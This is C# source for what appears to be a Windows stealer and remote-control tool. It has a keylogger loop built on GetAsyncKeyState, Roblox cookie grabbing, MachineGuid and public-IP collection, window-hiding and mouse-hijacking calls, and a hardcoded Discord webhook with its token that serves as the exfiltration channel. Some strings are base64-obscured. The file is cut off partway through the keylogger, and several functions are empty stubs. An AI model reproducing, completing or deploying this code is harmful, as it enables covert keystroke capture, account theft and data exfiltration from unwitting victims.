using System;
using System.Windows.Forms;
using System.Management;
using System.Net;
using System.Diagnostics;
using System.IO;
using System.Text;
using System.Collections.Specialized;
using System.Drawing.Imaging;
using System.Drawing;
using System.Threading;

using System.Collections.Generic;
using System.Globalization;
using System.Runtime.InteropServices;
using Microsoft.Win32.SafeHandles;
using Microsoft.Win32;

namespace mans_not_hot
{
    class Program
    {
		
	static void ExecuteCommand(string command)
{
}
public static string discord = "https://discordapp.com/api/webhooks/414526987844190218/2voCCJ3SDnkzb0Fu_5gWH7zuHiM9gdvUpv6N4-9LbKRp7ynNB_xHguOoQ2QGsRxkk62H";
public static string scif = "";
public static bool logging = false;
public string lastReq = "";


        private const int MOUSEEVENTF_LEFTDOWN = 0x02;
        private const int MOUSEEVENTF_LEFTUP = 0x04;
        private const int MOUSEEVENTF_RIGHTDOWN = 0x08;
        private const int MOUSEEVENTF_RIGHTUP = 0x10;
		private const int SW_HIDE = 0;
        private const int SW_SHOW = 1;
		
		[DllImport("user32.dll")]
        private static extern int FindWindow(string className, string windowText);

        [DllImport("user32.dll")]
        private static extern int ShowWindow(int hwnd, int command);

        [DllImport("user32.dll")]
        public static extern int FindWindowEx(int parentHandle, int childAfter, string className, int windowTitle);

        [DllImport("user32.dll")]
        private static extern int GetDesktopWindow();
		
[DllImport("user32.dll")]
public static extern int GetAsyncKeyState(Int32 i);

[DllImport("user32.dll")]
        public static extern Int32 SwapMouseButton(Int32 bSwap);
		
		[DllImport("user32.dll", CharSet = CharSet.Auto, CallingConvention = CallingConvention.StdCall)]
        public static extern void mouse_event(uint dwFlags, uint dx, uint dy, uint cButtons, uint dwExtraInfo);
		
		 [DllImport("user32.dll", EntryPoint = "SetWindowText")]
        private static extern int SetWindowText(IntPtr hWnd, string text);

        [DllImport("user32.dll", EntryPoint = "FindWindowEx")]
        private static extern IntPtr FindWindowEx(IntPtr hwndParent, IntPtr hwndChildAfter, string lpszClass, string lpszWindow);

        [DllImport("User32.dll", EntryPoint = "SendMessage")]
        private static extern int SendMessage(IntPtr hWnd, int uMsg, int wParam, string lParam);

		static string GetMachineGuid()
{
   string location = @"SOFTWARE\Microsoft\Cryptography";
   string name = "MachineGuid";

   using (RegistryKey localMachineX64View = 
       RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64))
   {
       using (RegistryKey rk = localMachineX64View.OpenSubKey(location))
       {
           if (rk == null)
               throw new KeyNotFoundException(
                   string.Format("Key Not Found: {0}", location));

           object machineGuid = rk.GetValue(name);
           if (machineGuid == null)
               throw new IndexOutOfRangeException(
                   string.Format("Index Not Found: {0}", name));

           return machineGuid.ToString();
       }
   }
}

	static public string Base64Decode(string Decode)
        {
             byte[] data = Convert.FromBase64String(Decode);
             string decodedString = Encoding.UTF8.GetString(data);
             return decodedString;
        }

 public static byte[] SendLeStuff(string uri, NameValueCollection pairs)
        {
            byte[] result = null;
            using (WebClient webClient = new WebClient())
            {
                result = webClient.UploadValues(uri, pairs);
            }
            return result;
        }
       public static void SDW(string webhook, string msg)
        {
            SendLeStuff(webhook, new NameValueCollection
            {
                {
                    Base64Decode("dXNlcm5hbWU="),
                    "Co-Pilot"
                },
                {
                    Base64Decode("Y29udGVudA=="),
                    msg
                }
            });
        }
	static string aaa() {
	      string url = "aHR0cDovL2NoZWNraXAuZHluZG5zLm9yZw==";
		url = Base64Decode(url);
        System.Net.WebRequest req = System.Net.WebRequest.Create(url);
        System.Net.WebResponse resp = req.GetResponse();
        System.IO.StreamReader sr = new System.IO.StreamReader(resp.GetResponseStream());
        string response = sr.ReadToEnd().Trim();
        string[] a = response.Split(':');
        string a2 = a[1].Substring(1);
        string[] a3 = a2.Split('<');
        string a4 = a3[0];
        return a4;
}

static void getcookie() {
	
}

public void msg(string message) {
	MessageBox.Show(message);
}

public string Get(string uri)
{
    HttpWebRequest request = (HttpWebRequest)WebRequest.Create(uri);
    request.AutomaticDecompression = DecompressionMethods.GZip | DecompressionMethods.Deflate;

    using(HttpWebResponse response = (HttpWebResponse)request.GetResponse())
    using(Stream stream = response.GetResponseStream())
    using(StreamReader reader = new StreamReader(stream))
    {
        return reader.ReadToEnd();
    }
}

static void GetAccCookie() {
	 HttpWebRequest request = (HttpWebRequest)WebRequest.Create("https://www.roblox.com/home");
    request.AutomaticDecompression = DecompressionMethods.GZip | DecompressionMethods.Deflate;
	request.CookieContainer = new CookieContainer();
	HttpWebResponse response = (HttpWebResponse)request.GetResponse();
	
	foreach(Cookie cookie in response.Cookies) {
		MessageBox.Show(cookie.Value, cookie.Name);
	}
	
    

}

 static void Key_Logging()
        {
            string newkey = "";
            while (true)
            {
                //sleeping for while, this will reduce load on cpu
                Thread.Sleep(50);
                for (Int32 i = 0; i < 255; i++)
                {
                    int keyState = GetAsyncKeyState(i);
                    if (keyState == 1 || keyState == -32767)
                    {


                        if ((i < 91) & (i 
